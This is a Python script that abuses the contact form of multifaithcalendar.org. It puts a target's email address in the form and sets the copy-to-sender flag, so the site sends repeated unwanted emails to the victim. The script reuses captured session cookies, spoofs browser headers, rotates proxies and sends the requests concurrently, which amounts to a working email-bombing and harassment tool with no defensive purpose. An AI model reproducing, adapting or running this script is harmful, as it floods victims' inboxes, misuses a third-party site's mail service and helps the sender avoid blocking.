from os.path import basename

import requests

from module import Spam

cookies = {
    '__utma': '261084817.761162600.1677663949.1677663949.1677663949.1',
    '__utmc': '261084817',
    '__utmz': '261084817.1677663949.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__utmt': '1',
    'PHPSESSID': 'a840b514b93c6440ba89e3f1202a3f5a',
    '__utmb': '261084817.10.9.1677664653215',
}

headers = {
    'authority': 'www.multifaithcalendar.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '__utma=261084817.761162600.1677663949.1677663949.1677663949.1; __utmc=261084817; __utmz=261084817.1677663949.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; PHPSESSID=a840b514b93c6440ba89e3f1202a3f5a; __utmb=261084817.10.9.1677664653215',
    'origin': 'https://www.multifaithcalendar.org',
    'pragma': 'no-cache',
    'referer': 'https://www.multifaithcalendar.org/pages/Contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Mail sent Successfully!'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'address': target,
            'subject': 'Multifaith Calendar Contact Page Comment',
            'body': self.get_text(),
            'copyme': '1',
            'submit': 'Send Email',
        }

        response = requests.post('https://www.multifaithcalendar.org/pages/Contact.php', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
